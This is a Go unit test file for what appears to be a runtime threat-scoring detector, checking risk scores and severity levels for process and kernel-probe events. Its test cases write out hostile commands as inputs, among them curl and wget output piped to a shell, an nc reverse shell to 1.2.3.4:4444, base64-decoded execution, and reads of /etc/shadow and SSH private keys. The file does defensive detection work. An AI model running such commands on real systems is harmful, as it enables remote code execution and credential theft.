package score

import "testing"

func TestScoreExec(t *testing.T) {
	cases := []struct {
		name    string
		binary  string
		args    string
		minWant int
	}{
		{"plain bash", "/bin/bash", "", 0},
		{"bash -c", "/bin/bash", "-c 'echo hi'", 1},
		{"curl plain", "/usr/bin/curl", "https://example.com", 3},
		{"curl pipe sh", "/usr/bin/curl", "-fsSL https://x.example.com | sh", 25},
		{"wget pipe bash", "/usr/bin/wget", "-qO- https://x | bash", 25},
		{"nc reverse shell", "/usr/bin/nc", "-e /bin/bash 1.2.3.4 4444", 20},
		{"nc plain", "/usr/bin/nc", "-l 8080", 5},
		{"base64 decode", "/bin/bash", "-c 'echo aGk= | base64 -d'", 15},
		{"chmod +x", "/usr/bin/chmod", "+x /tmp/payload", 5},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, _ := Score("process_exec", tc.binary, tc.args, "", 0)
			if got < tc.minWant {
				t.Fatalf("got=%d want>=%d", got, tc.minWant)
			}
		})
	}
}

func TestScoreKprobe(t *testing.T) {
	cases := []struct {
		name    string
		policy  string
		args    string
		wantMin int
	}{
		{"privilege-escalation", "privilege-escalation", "0", 15},
		{"shadow access", "sensitive-file-access", "/etc/shadow", 20},
		{"ssh access", "sensitive-file-access", "/root/.ssh/id_rsa", 20},
		{"sudoers access", "sensitive-file-access", "/etc/sudoers", 8},
		{"outbound", "outbound-connections", "", 12},
		{"unknown", "no-such-policy", "", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, _ := Score("process_kprobe", "/bin/bash", tc.args, tc.policy, 0)
			if got < tc.wantMin {
				t.Fatalf("got=%d want>=%d", got, tc.wantMin)
			}
		})
	}
}

func TestSeverity(t *testing.T) {
	cases := []struct {
		score int
		want  string
	}{
		{0, "info"},
		{4, "info"},
		{5, "low"},
		{9, "low"},
		{10, "medium"},
		{19, "medium"},
		{20, "high"},
		{39, "high"},
		{40, "critical"},
		{999, "critical"},
	}
	for _, tc := range cases {
		if got := Severity(tc.score); got != tc.want {
			t.Errorf("Severity(%d)=%q want %q", tc.score, got, tc.want)
		}
	}
}

func TestUnknownEventType(t *testing.T) {
	got, _ := Score("not_a_thing", "/bin/bash", "", "", 0)
	if got != 0 {
		t.Fatalf("unknown event type should score 0, got %d", got)
	}
}
